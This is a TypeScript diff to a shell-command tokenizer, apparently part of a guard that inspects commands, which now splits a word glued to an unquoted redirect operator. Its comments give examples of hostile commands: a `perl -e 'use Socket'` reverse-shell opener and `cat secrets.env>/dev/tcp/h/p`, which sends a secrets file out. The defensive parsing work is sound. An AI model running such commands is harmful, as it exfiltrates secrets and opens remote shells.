@@ -55,8 +55,11 @@ export function stripQuotedSpans(command: string, opts: LexOptions = {}): string
 // Split a command segment into whitespace-delimited tokens, treating a
 // single- or double-quoted span as one opaque token (so the inline script body
 // in `perl -e 'use Socket; ...'` is a single token, not the chain-breaking
-// words inside it). Quote characters are stripped from the emitted token. Good
-// enough for argv[0]/flag inspection — full shell word-splitting is not needed.
+// words inside it). Quote characters are stripped from the emitted token. An
+// unquoted redirect operator ends the word before it, as bash reads it:
+// `cat secrets.env>/dev/tcp/h/p` is `secrets.env` then a redirection, while
+// `2>&1` keeps its fd digits and `$((1<<2))` stays arithmetic. Good enough for
+// argv[0]/flag inspection — full shell word-splitting is not needed.
 export function tokenizeCommand(segment: string): string[] {
   const tokens: string[] = [];
   let cur = "";
@@ -73,12 +76,22 @@ export function tokenizeCommand(segment: string): string[] {
     } else if (/\s/.test(c)) {
       if (inToken) { tokens.push(cur); cur = ""; inToken = false; }
     } else {
+      if ((c === "<" || c === ">") && gluedWordBefore(cur)) { tokens.push(cur); cur = ""; }
       cur += c;
       inToken = true;
     }
   }
   if (inToken) tokens.push(cur);
   return tokens;
+}
+
+/** `cur` is a word a redirect operator glued onto: not empty, not the
+ *  operator's own fd digits (`2`, `3<` of `3<>`) or a `&`, not more
+ *  operator, and not inside an open parenthesis (arithmetic or a
+ *  substitution, read elsewhere). */
+function gluedWordBefore(cur: string): boolean {
+  if (!cur || /^\d*(?:&|[<>&|]*)$/.test(cur)) return false;
+  return cur.split("(").length <= cur.split(")").length;
 }
 
 // Split a command into its top-level shell segments on the separators that
